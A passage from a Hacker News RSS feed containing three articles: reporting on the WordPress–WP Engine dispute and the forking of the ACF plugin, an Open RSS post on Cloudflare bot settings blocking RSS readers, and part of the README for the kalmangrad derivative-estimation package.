large number</a> of other WordPress plugins such as <a href="https://wordpress.org/plugins/advanced-forms/">Advanced Forms
for ACF</a> and <a href="https://wpml.org/documentation/related-projects/translate-sites-built-with-acf/">WPML</a>
for translating WordPress sites.</p> 

<p>The base ACF plugin is free, but it also has a <a href="https://www.advancedcustomfields.com/pro/#pricing-table">paid
version</a> ("ACF Pro") with a yearly subscription. Both are available
under the GPLv2, but users must pay for access to updates on the Pro
version and those come directly from WP&nbsp;Engine.</p>

<p>On September&nbsp;28, Mullenweg <a href="https://wordpress.slack.com/archives/C02RQBWTW/p1727501240087269">asked
on Slack</a> whether ACF&nbsp;Pro should be included in <a href="https://solidwp.com/blog/wordpress-core/">WordPress core</a>,
the components and functionality included in a default install of
WordPress. That drew mixed responses in the channel. Some users noted
that the ability to add custom fields was long overdue, but others had <a href="https://wordpress.slack.com/archives/C02RQBWTW/p1727505491855069?thread_ts=1727501240.087269&amp;cid=C02RQBWTW">qualms</a>
about taking over ACF&nbsp;Pro "<q>out of spite</q>". Richard Korthuis <a href="https://wordpress.slack.com/archives/C02RQBWTW/p1727505533162479?thread_ts=1727501240.087269&amp;cid=C02RQBWTW">asked</a>
what kind of message it would send to other developers who create paid
plugins: "<q>No matter what you think about WP Engine and the whole
dispute, this [sends] developers the wrong message and would prevent
future investments in new plugins</q>".</p>

<p>In a <a href="https://i.imgur.com/iN3MQkN.png">now-deleted
Tweet</a>, Automattic announced on October&nbsp;5, a Saturday, that it had "<q>responsibly disclosed
a vulnerability</q>" in ACF to WP&nbsp;Engine. The company did not provide
further details. John Blackbourn, the WordPress core security team
lead, <a href="https://twitter.com/johnbillion/status/1842627564453454049">said</a>
that Automattic had breached the <a href="https://kb.intigriti.com/en/articles/6054585-intigriti-code-of-conduct">Intigriti
Code of Conduct</a> by "<q>irresponsibly announcing</q>" the
vulnerability publicly. Intigriti is a company that runs bug-bounty programs
for companies, <a href="https://app.intigriti.com/programs/wpengine/wpengine/detail">including
WP&nbsp;Engine</a>.</p>

<p>On October&nbsp;7, WP&nbsp;Engine <a href="https://www.advancedcustomfields.com/blog/acf-6-3-8-security-release/">announced</a> a
security release of the plugin. The vulnerability itself seems to be
minor, according to the release notes. It is not a flaw that can be
exploited remotely and it only impacts "<q>the unlikely
scenario</q>" where a user with administrative privileges tries to
attack other administrative users, or tries to gain super-admin
privileges on a multi-site installation of WordPress. So far few other
details on the vulnerability beyond that have been provided. Another <a href="https://lwn.net/Articles/967192/">XZ&nbsp;backdoor</a> it is not.</p>

<p>Because its
developers are now blocked from WordPress.org, WP&nbsp;Engine had to <a href="https://x.com/wp_acf/status/1843376378210857441">provide its fix
to the WordPress Security team</a> to have it uploaded to the plugin
directory. There are also <a href="https://www.advancedcustomfields.com/blog/installing-and-upgrading-to-the-latest-version-of-acf/">instructions</a>
on updating the plugin manually to receive updates directly from WP&nbsp;Engine.</p>

<h4>ACF fork</h4>

<p>Mullenweg made an <a href="https://wordpress.org/news/2024/10/secure-custom-fields/">announcement</a>
on October&nbsp;12, another Saturday, "<q>on behalf of the <a href="https://wordpress.org/about/security/">WordPress
security team</a></q>" that ACF was being forked as <a href="https://wordpress.org/plugins/advanced-custom-fields/">Secure Custom
Fields</a> (SCF) under <a href="https://github.com/wordpress/wporg-plugin-guidelines/blob/trunk/guideline-18.md">point&nbsp;18</a>
of the <a href="https://github.com/WordPress/wporg-plugin-guidelines/tree/trunk?tab=readme-ov-file#table-of-contents">plugin
directory guidelines</a>. That part of the guidelines states, in part,
that WordPress.org may "<q>remove developer access to a plugin in lieu
of a new, active, developer</q>" and "<q>make changes to a plugin,
without developer consent, in the interest of public
safety</q>". According to the post this move was "<q>a rare and
unusual situation brought on by WP Engine's legal attacks</q>".</p>

<p>Automattic has not merely forked the ACF code and made it available
under a new name to compete with WP&nbsp;Engine. That might raise a
few eyebrows, but it would probably be considered fair game by most
observers.</p>

<p>Instead, it has forked the code and taken over the plugin's entry,
including all of its reviews, in the WordPress.org catalog. The new
plugin is being substituted in place of ACF for all of the users who have
installed it previously. According to the announcement on
WordPress.org, sites that auto-update plugins will receive the SCF
plugin automatically. Some site owners may be unaware that the plugin
has been silently replaced. According to a <a href="https://news.ycombinator.com/item?id=41833808">comment</a> by
Mullenweg on Hacker News on October&nbsp;14, there have already
been 225k downloads of the new plugin, and he estimated "<q>at least 60%
of the sites with auto-upgrade on and using .org for updates</q>" have
been moved to the fork.</p>

<p>This is not the first time a company has taken control of a package
distributed through a central repository, though it is rare. The <a href="https://lwn.net/Articles/681410/">left-pad
incident</a> in 2016, for example, saw <a href="https://www.npmjs.com/">npm,
Inc.</a> restore left-pad to the Node.js package
repository after its developer, Azer Koçulu, removed it. That move, however, was
intended to reduce disruption to the Node.js ecosystem: the removal had
broken builds for thousands of projects that had included the package,
and Koçulu had effectively abandoned it.</p>

<p>The takeover of ACF's place in the WordPress directory, on the
other hand, is a punitive move by Automattic against another company
that reaches beyond WordPress.org's infrastructure into millions of
WordPress installs. Web developer Charles Fulton <a href="https://blog.goodbyeplease.com/2024/10/12/The-call-is-coming-from-inside-the-house/">wrote</a>
about the incident and said that this is "<q>a profoundly destabilizing action for the WordPress
plugin ecosystem</q>"; he wondered if he needed to worry about updates
to core WordPress that might interfere with ACF Pro.</p>

<h4>WPGraphQL brought into the fold</h4>

<p>Users of ACF Pro that depend on the <a href="https://www.wpgraphql.com/">WPGraphQL</a> and <a href="https://acf.wpgraphql.com/">WPGraphQL for Advanced Custom
Fields</a> plugins may have real cause to be concerned that Automattic
will look to break compatibility for ACF. WPGraphQL
provides a <a href="https://graphql.org/">GraphQL</a>
schema and API for WordPress sites and is a popular plugin to
use in conjunction with ACF. Jason Bahl, the maintainer of the  plugin, <a href="https://www.wpgraphql.com/2024/10/07/wpgraphql-becomes-a-canonical-plugin-my-move-to-automattic">announced</a>
on October&nbsp;7 that he was leaving WP&nbsp;Engine to join
Automattic. Additionally, he said that WPGraphQL is becoming a
"<q>canonical plugin</q>" for WordPress.</p>

<p>The concept of canonical plugins is
loosely defined, but Mullenweg <a href="https://make.wordpress.org/core/2022/09/11/canonical-plugins-revisited/">described
them</a> in 2022 as official plugins that are the first choice
for a type of functionality, but too niche to be included in the core
distribution. With WPGraphQL development under Automattic's roof, it
seems unlikely that compatibility with ACF will be a priority.</p>

<p>Scott Kingsley Clark, who has been involved in a project to bring a
fields API into the WordPress core, <a href="https://make.wordpress.org/core/2024/10/13/fields-api-team-seeking-new-leadership/">announced</a>
on October&nbsp;13 that he was stepping down from contributing to
WordPress core. The <a href="https://github.com/sc0ttkclark/wordpress-fields-api">fields API
project</a> on GitHub has been archived with a goodbye notice that
states that it pains him to stop but that he is "<q>done making excuses for
Matt's actions and will not associate myself with core any
longer</q>". He <a href="https://scottodon.com/@skc/113297201274378086">added</a>
on Mastodon.social that he was going to remain part of the WordPress
community overall, and continue working on the <a href="https://wordpress.org/plugins/pods/">Pods</a> plugin.</p>

<h4>What next?</h4>

<p>What happens next, what Mullenweg will <em>do</em> next, is
anyone's guess. Mullenweg's vendetta against WP&nbsp;Engine has
spilled over into the community in a way that can't easily be
ignored or avoided. His leadership of the project is being repeatedly
called into question by contributors, users, and outside
observers. That will spill over, if it hasn't already, into the wider
commercial ecosystem and have serious consequences for plugin
creators, creative agencies, and hosting providers who have invested a
lot into WordPress.</p>

<p>More contributors are likely to step away, whether they do so
publicly or simply drift away and find other things to do with their
time. Quite a few users on social networks have commented that they
would no longer recommend WordPress and are looking for
alternatives. A fork, in addition to <a href="https://lwn.net/Articles/992219/">ClassicPress</a>, seems almost
inevitable.</p>

<p>There is a legitimate conversation to be had, or continued, about the
commercialization of open-source projects by companies that do little
to sustain open-source software but reap its benefits and pull revenue
away from the companies that <em>do</em> put in the work. That conversation has
been completely eclipsed by Mullenweg's actions to punish WP&nbsp;Engine.</p>

<h4>Mullenweg the "mad king"</h4>

<p>Armin Ronacher, creator of the <a href="https://flask.palletsprojects.com/en/3.0.x/">Flask</a> web
framework for Python and participant in launching the <a href="https://lwn.net/Articles/993073/">Open Source Pledge</a>, has some <a href="https://lucumr.pocoo.org/2024/10/14/mixing-oss-and-money/">interesting
thoughts</a> on the topic of mixing money and open source in light of
the ongoing WordPress crisis:</p>

<blockquote>
Is it a wise [idea] to mix Open Source and money? Maybe not. Yet I also
believe it's something that is just a reality we need to
navigate. Today there are some projects too small to get any funding
(xz) and there are projects large enough to find some way to sustain
by funneling money to it (Rails, WordPress).
</blockquote>

<p>He observes that he has seen too many
people in open source struggle "<q>one way or another</q>" as a direct
or indirect result of work in open source. He says Mullenweg, like
other creators of open-source projects, feels wronged by seeing others
find financial success from his project even though WordPress is
uncommonly successful "<q>in terms of impact, success, and financial
return for its creator</q>". Mullenweg's actions, Ronacher said,
"<q>have alienated many who would otherwise support him. He's turning into a 'mad
king'</q>".</p>

<p>That is deeply unfortunate, because the questions about sustainability
of open-source projects, and who profits from them versus who produces
them, are in need of addressing. Instead of having <em>that</em>
conversation, Mullenweg has put questions about governance,
centralized software distribution, and software supply chains at the forefront.</p>

<p>After decades of being a poster child for the goodness of open
source, WordPress is becoming a case study in the dangers of the
company-owned project model. Instead of being the safe choice,
WordPress is starting to be seen as the risky one—and that
perception may impact open source as a whole.</p>

<br clear="all">
               <br clear="all">
               <hr>
            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Using Cloudflare on your website could be blocking RSS users (424 pts)]]></title>
            <link>https://openrss.org/blog/using-cloudflare-on-your-website-could-be-blocking-rss-users</link>
            <guid>41864632</guid>
            <pubDate>Wed, 16 Oct 2024 22:46:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://openrss.org/blog/using-cloudflare-on-your-website-could-be-blocking-rss-users">https://openrss.org/blog/using-cloudflare-on-your-website-could-be-blocking-rss-users</a>, See on <a href="https://news.ycombinator.com/item?id=41864632">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                    <article>
                        
                        <header>
                            <time datetime="2024-10-16T00:00:00.000Z">October 16, 2024</time>
                        </header>
                        <picture>
<source srcset="https://openrss.org/media/cloudflare-headline-image-dark.png" media="(prefers-color-scheme: dark)">
<img src="https://openrss.org/media/cloudflare-headline-image.png" alt="Image of Cloudflare logo of what looks like a sun setting on a horizon with the words Cloudflare underneath in a super bold, dark gray font">
</picture>

<p>Many users prefer to use an RSS feed reader to stay up to date with the content on the websites they visit. But if you've enabled Cloudflare on your website, you're likely blocking these RSS users from accessing your website content without realizing it.</p>
<a id="the-cloudflare-features-that-block-rss-readers" href="#the-cloudflare-features-that-block-rss-readers"></a>
<p>In Cloudflare's dashboard, you'll find <a href="https://developers.cloudflare.com/waf/tools/">tools</a> designed to block bot traffic to your website. Particularly, the Bot Fight Mode and block all "AI scrapers and crawlers" options below. When enabled, these features end up blocking users who access your website through RSS readers, even though RSS readers are legitimate and aren't malicious bots.</p>
<figure>
<img src="https://openrss.org/media/cloudflare-bot-security-dashboard-detection-configuration.png" alt="An image of the Bot Fight Mode and AI Scrapers and Crawlers configuration toggles on Cloudflare's Security dashboard">
<figcaption>A screenshot of Cloudflare's Bot Fight Mode and block all "AI scrapers and crawlers" features that block RSS readers from accessing a website</figcaption>
</figure>

<a id="how-cloudflare-blocks-rss-readers-from-your-website" href="#how-cloudflare-blocks-rss-readers-from-your-website"></a>
<p>When enabling the tools, Cloudflare will evaluate each visit to your website and determine whether the visit is from an AI scraper or "bot" based on a <a href="https://developers.cloudflare.com/bots/concepts/bot-score">score</a> , which ironically Cloudflare uses AI to generate.</p>
<picture>
<source srcset="https://openrss.org/media/rss-readers-blocked-by-cloudflare-dark.png" media="(prefers-color-scheme: dark)">
<img src="https://openrss.org/media/rss-readers-blocked-by-cloudflare.png" alt="Image of an RSS reader blocked by Cloudflare">
</picture>

<p>Then, when a user's RSS reader attempts to read your website, Cloudflare presents it with a number of <a href="https://developers.cloudflare.com/waf/reference/cloudflare-challenges/">challenges</a> that the reader would never be able to fulfill.</p>
<p>Here's an example of the Human Verification challenge that an RSS reader would be shown when it tries to visit your website. The challenge requires a human to solve and, because an RSS reader is not a human, it can never complete them.</p>
<picture>
<source srcset="https://openrss.org/media/cloudflare-human-verification-dark.png" media="(prefers-color-scheme: dark)">
<img src="https://openrss.org/media/cloudflare-human-verification.png" alt="A screenshot of Cloudflare-enabled website presenting a human verification screen">
</picture>

<p>In other cases, Cloudflare will simply block the RSS reader from accessing your website without a reason.</p>
<img src="https://openrss.org/media/cloudflare-block.png" alt="A screenshot of Cloudflare-enabled website presenting a human verification screen">

<p>The only way to resolve when Cloudflare blocks an RSS reader from accessing your website is by contacting you directly and asking you to make a custom rule to unblock it. But Cloudflare shouldn't expect people to contact every owner of every Cloudflare website that blocks their RSS reader. And you shouldn't have to waste time logging into Cloudflare to add an exception every time they block an RSS reader, either.</p>
<a id="unblock-rss-readers-while-still-using-cloudflare" href="#unblock-rss-readers-while-still-using-cloudflare"></a>
<p>Even though Cloudflare blocks RSS readers from your website, you can whitelist RSS readers as a workaround. This would at least unblock RSS readers without having to turn off any security features that you may have already been enabled until Cloudflare better addresses the issue.</p>
<p>First, find the user agent of any blocked RSS reader in Cloudflare's analytics dashboard. The&nbsp;<code>User-Agent</code>&nbsp;of most good RSS readers usually include the name of the reader, it's URL, or a word like "RSS" or "feed" that makes it obvious that it's an RSS reader.</p>
<p>Once you've identified an RSS reader's user agent, you can&nbsp;<a href="https://developers.cloudflare.com/waf/custom-rules/use-cases/allow-traffic-from-ips-in-allowlist/">create a custom</a>&nbsp;rule that explicitly whitelists and allows all traffic by the reader's IP address or by it's user agent string. Note that user agents can be disguised, so it's often better to whitelist the reader's IP address instead of the user agent. If you'd like to whitelist Open RSS, please&nbsp;<a href="https://openrss.org/contact">contact us</a>&nbsp;for the required information.</p>
<a id="cloudflare-needs-a-better-way-to-allow-rss-readers" href="#cloudflare-needs-a-better-way-to-allow-rss-readers"></a>
<p>Cloudflare offers a bot verification program to which RSS readers owners can manually apply to avoid being blocked by websites, but this program isn't guaranteed to work and it suffers from quite a few problems.</p>
<ul>
<li><p><strong>The verification process is flimsy</strong> — They're using a <a href="https://docs.google.com/forms/d/e/1FAIpQLSdqYNuULEypMnp4i5pROSc-uP6x65Xub9svD27mb8JChA_-XA/viewform">Google form</a> for applications to the program. Then after applying, no notification is sent that they're working on it or even received the application successfully (we've tried <a href="https://openrss.org/issue/144#202406210145">applying twice</a>), with no progress updates or expected timeframe for completion.</p>
</li>
<li><p><strong>Verified RSS readers are still being blocked</strong> — There are reports that RSS readers Cloudflare has verified as "good bots" are still being blocked from websites. If Cloudflare has successfully approved an RSS reader as a "good bot", it shouldn't be blocked or still require website owners to add any custom exception rules.</p>
</li>
<li><p><strong>Unblocking RSS readers across multiple websites is cumbersome</strong> — Cloudflare's only resolution to unblocking RSS readers is for the owners of the readers to contact each website owner directly and ask for an exception to be made. While that may work for one-off cases, this is unreasonable for RSS readers that have to access thousands of different Cloudflare-enabled websites each day. It's also overwhelming for website owners to configure exceptions for each and every RSS reader.</p>
</li>
</ul>
<p>To be clear, there's nothing wrong with using Cloudflare's security tools on your website to help deal with malicious AI bots, scrapers, and potential attacks. But Cloudflare needs to ensure that people who use RSS tools aren't blocked from accessing your website content, and make it easier to resolve when they are.</p>
 
    <small>
        <br>
        <center>❤</center>
        <em>
            Open RSS is a registered 501(c)(3) nonprofit headquartered in the
            District of Columbia, USA and funded only by voluntary donations of
            its users. If you enjoy using Open RSS, we'd be so grateful if you'd
            consider
            <a href="https://openrss.org/donate">donating</a> to help us grow and
            continue to provide you with a quality and reliable service.
        </em>
    </small>

                    </article>
                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Automated smooth Nth order derivatives of noisy data (137 pts)]]></title>
            <link>https://github.com/hugohadfield/kalmangrad</link>
            <guid>41863398</guid>
            <pubDate>Wed, 16 Oct 2024 20:17:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/hugohadfield/kalmangrad">https://github.com/hugohadfield/kalmangrad</a>, See on <a href="https://news.ycombinator.com/item?id=41863398">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Kalmangrad</h2><a id="user-content-kalmangrad" aria-label="Permalink: Kalmangrad" href="#kalmangrad"></a></p>
<p dir="auto"><code>kalmangrad</code> is a python package that calculates automated smooth N'th order derivatives of non-uniformly sampled time series data. The approach leverages Bayesian filtering techniques to compute derivatives up to any specified order, offering a robust alternative to traditional numerical differentiation methods that are sensitive to noise. This package is built on top of the underlying <a href="https://github.com/hugohadfield/bayesfilter/">bayesfilter</a> package.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/hugohadfield/kalmangrad/blob/main/Figure_1.jpeg"><img src="https://github.com/hugohadfield/kalmangrad/raw/main/Figure_1.jpeg" alt="Results"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Table of Contents</h2><a id="user-content-table-of-contents" aria-label="Permalink: Table of Contents" href="#table-of-contents"></a></p>
<ul dir="auto">
<li><a href="#introduction">Introduction</a></li>
<li><a href="#features">Features</a></li>
<li><a href="#installation">Installation</a></li>
<li><a href="#usage">Usage</a></li>
<li><a href="#example">Example</a></li>
<li><a href="#functions-overview">Functions Overview</a></li>
<li><a href="#dependencies">Dependencies</a></li>
<li><a href="#license">License</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Introduction</h2><a id="user-content-introduction" aria-label="Permalink: Introduction" href="#introduction"></a></p>
<p dir="auto">Estimating derivatives from noisy data is a common challenge in fields like signal processing, control systems, and data analysis. Traditional numerical differentiation amplifies noise, leading to inaccurate results. Anyone who has naiivly attempted to differentiate sensor data has run into this problem. This repository implements a bayesian filtering based method to estimate derivatives of any order, providing smoother and more accurate estimates even in the presence of noise and non-uniform sampling.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li><strong>Higher-Order Derivative Estimation</strong>: Compute derivatives up to any specified order.</li>
<li><strong>Robust to Noise</strong>: Uses Bayesian filtering to mitigate the effects of noise in the data.</li>
<li><strong>Flexible Time Steps</strong>: Handles non-uniformly sampled data with automatic time step adjustment.</li>
<li><strong>Easy Integration</strong>: Its simple API allows for easy integration into existing projects.</li>
<li><strong>Few Dependencies</strong>: Requires only NumPy and the BayesFilter package (which is turn just needs NumPy).</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<ol dir="auto">
<li>
<p dir="auto"><strong>Install from PyPI</strong>:</p>

</li>
<li>
<p dir="auto"><strong>Install from Source</strong>:</p>
<ul dir="auto">
<li>
<p dir="auto">Clone the repository:</p>

</li>
<li>
<p dir="auto">Install the package:</p>
</li>
</ul>

</li>
</ol>
<p dir="auto"><h2 tabindex="-1" dir="auto">Usage</h2><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>
<p dir="auto">The main function provided is <code>grad</code>, which estimates the derivatives of the input data <code>y</code> sampled at times <code>t</code>.</p>
<div dir="auto" data-snippet-clipboard-copy-content="def grad(
    y: np.ndarray, 
    t: np.ndarray, 
    n: int = 1,
    delta_t = None,
    obs_noise_std = 1e-2
) -> Tuple[List[Gaussian], np.ndarray]:
    &quot;&quot;&quot;
    Estimates the derivatives of the input data y up to order n.

    Parameters:
    - y (np.ndarray): Observed data array.
    - t (np.ndarray): Time points corresponding to y.
    - n (int): Maximum order of derivative to estimate (default is 1).
    - delta_t (float, optional): Time step for the Kalman filter. If None, it's automatically determined.
    - obs_noise_std (float): Standard deviation of the observation noise (default is 1e-2).

    Returns:
    - smoother_states (List[Gaussian]): List of Gaussian states containing mean and covariance estimates.
    - filter_times (np.ndarray): Time points corresponding to the estimates.
    &quot;&quot;&quot;"><pre><span>def</span> <span>grad</span>(
    <span>y</span>: <span>np</span>.<span>ndarray</span>, 
    <span>t</span>: <span>np</span>.<span>ndarray</span>, 
    <span>n</span>: <span>int</span> <span>=</span> <span>1</span>,
    <span>delta_t</span> <span>=</span> <span>None</span>,
    <span>obs_noise_std</span> <span>=</span> <span>1e-2</span>
) <span>-&gt;</span> <span>Tuple</span>[<span>List</span>[<span>Gaussian</span>], <span>np</span>.<span>ndarray</span>]:
    <span>"""</span>
<span>    Estimates the derivatives of the input data y up to order n.</span>
<span></span>
<span>    Parameters:</span>
<span>    - y (np.ndarray): Observed data array.</span>
<span>    - t (np.ndarray): Time points corresponding to y.</span>
<span>    - n (int): Maximum order of derivative to estimate (default is 1).</span>
<span>    - delta_t (float, optional): Time step for the Kalman filter. If None, it's automatically determined.</span>
<span>    - obs_noise_std (float): Standard deviation of the observation noise (default is 1e-2).</span>
<span></span>
<span>    Returns:</span>
<span>    - smoother_states (List[Gaussian]): List of Gaussian states containing mean and covariance estimates.</span>
<span>    - filter_times (np.ndarray): Time points corresponding to the estimates.</span>
<span>    """</span></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Example</h2><a id="user-content-example" aria-label="Permalink: Example" href="#example"></a></p>
<p dir="auto">Below is an example demonstrating how to estimate the first and second derivatives of noisy sinusoidal data.</p>
<div dir="auto" data-snippet-clipboard-copy-content="import numpy as np
import matplotlib.pyplot as plt

# Import the grad function
from kalmangrad import grad  # Replace with the actual module name

# Generate noisy sinusoidal data with random time points
np.random.seed(0)
t = sorted(np.random.uniform(0.0, 10.0, 100))
noise_std = 0.01
y = np.sin(t) + noise_std * np.random.randn(len(t))
true_first_derivative = np.cos(t)
true_second_derivative = -np.sin(t)

# Estimate derivatives using the Kalman filter
N = 2  # Order of the highest derivative to estimate
smoother_states, filter_times = grad(y, t, n=N)

# Extract estimated derivatives
estimated_position = [state.mean()[0] for state in smoother_states]
estimated_first_derivative = [state.mean()[1] for state in smoother_states]
estimated_second_derivative = [state.mean()[2] for state in smoother_states]

# Plot the results
plt.figure(figsize=(12, 9))

# Position
plt.subplot(3, 1, 1)
plt.plot(t, y, 'k.', label='Noisy Observations')
plt.plot(filter_times, estimated_position, 'b-', label='Estimated Position')
plt.plot(t, np.sin(t), 'r--', label='True Position')
plt.legend(loc='upper right')
plt.ylim(-1.5, 1.5)
plt.title('Position')

# First Derivative
plt.subplot(3, 1, 2)
plt.plot(filter_times, estimated_first_derivative, 'b-', label='Estimated First Derivative')
plt.plot(t, true_first_derivative, 'r--', label='True First Derivative')
plt.plot(
    t,
    np.gradient(y, t),
    'k-',
    label='np.gradient calculated derivative'
)
plt.legend(loc='upper right')
plt.ylim(-1.5, 1.5)
plt.title('First Derivative')

# Second Derivative
plt.subplot(3, 1, 3)
plt.plot(filter_times, estimated_second_derivative, 'b-', label='Estimated Second Derivative')
plt.plot(t, true_second_derivative, 'r--', label='True Second Derivative')
plt.legend(loc='upper right')
plt.ylim(-1.5, 1.5)
plt.title('Second Derivative')

plt.tight_layout()
plt.show()"><pre><span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>matplotlib</span>.<span>pyplot</span> <span>as</span> <span>plt</span>

<span># Import the grad function</span>
<span>from</span> <span>kalmangrad</span> <span>import</span> <span>grad</span>  <span># Replace with the actual module name</span>

<span># Generate noisy sinusoidal data with random time points</span>
<span>np</span>.<span>random</span>.<span>seed</span>(<span>0</span>)
<span>t</span> <span>=</span> <span>sorted</span>(<span>np</span>.<span>random</span>.<span>uniform</span>(<span>0.0</span>, <span>10.0</span>, <span>100</span>))
<span>noise_std</span> <span>=</span> <span>0.01</span>
<span>y</span> <span>=</span> <span>np</span>.<span>sin</span>(<span>t</span>) <span>+</span> <span>noise_std</span> <span>*</span> <span>np</span>.<span>random</span>.<span>randn</span>(<span>len</span>(<span>t</span>))
<span>true_first_derivative</span> <span>=</span> <span>np</span>.<span>cos</span>(<span>t</span>)
<span>true_second_derivative</span> <span>=</span> <span>-</span><span>np</span>.<span>sin</span>(<span>t</span>)

<span># Estimate derivatives using the Kalman filter</span>
<span>N</span> <span>=</span> <span>2</span>  <span># Order of the highest derivative to estimate</span>
<span>smoother_states</span>, <span>filter_times</span> <span>=</span> <span>grad</span>(<span>y</span>, <span>t</span>, <span>n</span><span>=</span><span>N</span>)

<span># Extract estimated derivatives</span>
<span>estimated_position</span> <span>=</span> [<span>state</span>.<span>mean</span>()[<span>0</span>] <span>for</span> <span>state</span> <span>in</span> <span>smoother_states</span>]
<span>estimated_first_derivative</span> <span>=</span> [<span>state</span>.<span>mean</span>()[<span>1</span>] <span>for</span> <span>state</span> <span>in</span> <span>smoother_states</span>]
<span>estimated_second_derivative</span> <span>=</span> [<span>state</span>.<span>mean</span>()[<span>2</span>] <span>for</span> <span>state</span> <span>in</span> <span>smoother_states</span>]

<span># Plot the results</span>
<span>plt</span>.<span>figure</span>(<span>figsize</span><span>=</span>(<span>12</span>, <span>9</span>))

<span># Position</span>
<span>plt</span>.<span>subplot</span>(<span>3</span>, <span>1</span>, <span>1</span>)
<span>plt</span>.<span>plot</span>(<span>t</span>, <span>y</span>, <span>'k.'</span>, <span>label</span><span>=</span><span>'Noisy Observations'</span>)
<span>plt</span>.<span>plot</span>(<span>filter_times</span>, <span>estimated_position</span>, <span>'b-'</span>, <span>label</span><span>=</span><span>'Estimated Position'</span>)
<span>plt</span>.<span>plot</span>(<span>t</span>, <span>np</span>.<span>sin</span>(<span>t</span>), <span>'r--'</span>, <span>label</span><span>=</span><span>'True Position'</span>)
<span>plt</span>.<span>legend</span>(<span>loc</span><span>=</span><span>'upper right'</span>)
<span>plt</span>.<span>ylim</span>(<span>-</span><span>1.5</span>, <span>1.5</span>)
<span>plt</span>.<span>title</span>(<span>'Position'</span>)

<span># First Derivative</span>
<span>plt</span>.<span>subplot</span>(<span>3</span>, <span>1</span>, <span>2</span>)
<span>plt</span>.<span>plot</span>(<span>filter_times</span>, <span>estimated_first_derivative</span>, <span>'b-'</span>, <span>label</span><span>=</span><span>'Estimated First Derivative'</span>)
<span>plt</span>.<span>plot</span>(<span>t</span>, <span>true_first_derivative</span>, <span>'r--'</span>, <span>label</span><span>=</span><span>'True First Derivative'</span>)
<span>plt</span>.<span>plot</span>(
    <span>t</span>,
    <span>np</span>.<span>gradient</span>(<span>y</span>, <span>t</span>),
    <span>'k-'</span>,
    <span>label</span><span>=</span><span>'np.gradient calculated derivative'</span>
)
<span>plt</span>.<span>legend</span>(<span>loc</span><span>=</span><span>'upper right'</span>)
<span>plt</span>.<span>ylim</span>(<span>-</span><span>1.5</span>, <span>1.5</span>)
<span>plt</span>.<span>title</span>(<span>'First Derivative'</span>)

<span># Second Derivative</span>
<span>plt</span>.<span>subplot</span>(<span>3</span>, <span>1</span>, <span>3</span>)
<span>plt</span>.<span>plot</span>(<span>filter_times</span>, <span>estimated_second_derivative</span>, <span>'b-'</span>, <span>label</span><span>=</span><span>'Estimated Second Derivative'</span>)
<span>plt</span>.<span>plot</span>(<span>t</span>, <span>true_second_derivative</span>, <span>'r--'</span>, <span>label</span><span>=</span><span>'True Second Derivative'</span>)
<span>plt</span>.<span>legend</span>(<span>loc</span><span>=</span><span>'upper right'</span>)
<span>plt</span>.<span>ylim</span>(<span>-</span><span>1.5</span>, <span>1.5</span>)
<span>plt</span>.<span>title</span>(<span>'Second Derivative'</span>)

<span>plt</span>.<span>tight_layout</span>()
<span>plt</span>.<span>show</span>()</pre></div>
<p dir="auto"><strong>Explanation:</strong></p>
<ul dir="auto">
<li><strong>Data Generation</strong>: We generate noisy observations of a sine wave.</li>
<li><strong>Derivative Estimation</strong>: The <code>grad</code> function is called with <code>n=2</code> to estimate up to the second derivative.</li>
<li><strong>Result Extraction</strong>: The mean estimates for position and derivatives are extracted from the Gaussian states.</li>
<li><strong>Visualization</strong>: The true functions and the estimates are plotted for comparison.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Functions Overview</h2><a id="user-content-functions-overview" aria-label="Permalink: Functions Overview" href="#functions-overview"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><code>transition_func(y, delta_t, n)</code></h3><a id="user-content-transition_funcy-delta_t-n" aria-label="Permalink: transition_func(y, delta_t, n)" href="#transition_funcy-delta_t-n"></a></p>
<p dir="auto">Computes the new state vector at time <code>t + delta_t</code> given the current state vector <code>y</code> at time <code>t</code>, for a Kalman filter of order <code>n</code>.</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Parameters</strong>:</p>
<ul dir="auto">
<li><code>y (np.ndarray)</code>: Current state vector <code>[y, y', y'', ..., y^(n)]^T</code>.</li>
<li><code>delta_t (float)</code>: Time step.</li>
<li><code>n (int)</code>: Order of the derivative.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Returns</strong>:</p>
<ul dir="auto">
<li><code>new_y (np.ndarray)</code>: Updated state vector at time <code>t + delta_t</code>.</li>
</ul>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto"><code>transition_matrix(delta_t, n)</code></h3><a id="user-content-transition_matrixdelta_t-n" aria-label="Permalink: transition_matrix(delta_t, n)" href="#transition_matrixdelta_t-n"></a></p>
<p dir="auto">Returns the state transition matrix <code>A</code> for a Kalman filter of order <code>n</code>.</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Parameters</strong>:</p>
<ul dir="auto">
<li><code>delta_t (float)</code>: Time step.</li>
<li><code>n (int)</code>: Order of the derivative.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Returns</strong>:</p>
<ul dir="auto">
<li><code>A (np.ndarray)</code>: Transition matrix of size <code>(n+1, n+1)</code>.</li>
</ul>
</li>
</ul>
